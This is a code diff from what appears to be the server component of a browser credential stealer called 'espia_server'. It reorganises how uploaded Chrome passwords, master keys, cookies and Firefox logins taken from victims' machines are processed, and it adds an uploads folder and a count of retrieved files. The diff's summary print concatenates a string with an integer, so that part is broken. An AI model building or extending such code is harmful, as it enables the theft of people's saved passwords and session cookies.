@@ -1,18 +1,39 @@
-from espia_server.app.browsers.chrome.chrome_utils import handle_chrome_cookies
-from espia_server.app.browsers.chrome.chrome_utils import handle_chrome_passwords
-from espia_server.app.browsers.firefox.firefox_utils import handle_firefox_passwords
+from app.browsers.firefox.firefox_utils import handle_all_firefox_modules
+from app.browsers.chrome.chrome_utils import handle_all_chrome_modules
 
+from colored import fg
+
+import pathlib
+import os
+
+
+
+# For output purposes
+block = fg('light_sky_blue_3a')
+title = fg('blue')
+main_title = fg('red')
+data = fg('dark_green_sea')
+
+
+uploads_path = pathlib.Path(pathlib.Path(os.path.realpath(__file__)).parent / 'uploads')
+uploaded_products = []
+
+def handle_new_uploaded_file(file_name: str) -> pathlib.Path:
+    '''
+    Returns the specified new path for an uploaded file
+
+    :param file_name: string file name
+    :return: pathlib object  to full upload path
+    '''
+    file_path = uploads_path / file_name
+    file_path.parent.mkdir(exist_ok=True, parents=True)
+    return file_path
 
 def handle_products_results(results: dict) -> None:
-    chrome_passwords = results.get("Chrome-Passwords")
-    chrome_master_key = results.get("Chrome-Masterkey")
-    handle_chrome_passwords(chrome_passwords, chrome_master_key)
+    handle_all_chrome_modules(results)
+    handle_all_firefox_modules(results)
+    output_summary()
 
-    chrome_cookies = results.get("Chrome-Cookies")
-    handle_chrome_cookies(chrome_cookies, chrome_master_key)
-
-    firefox_passwords = results.get("Firefox-Passwords")
-
-    handle_firefox_passwords(firefox_passwords.get("logins"))
-
-    firefox_cookies = results.get("Firefox-Cookies")
+def output_summary():
+    print(block + '[--]')
+    print(title + '|Amount of files retrieved|' + data + len(uploaded_products))
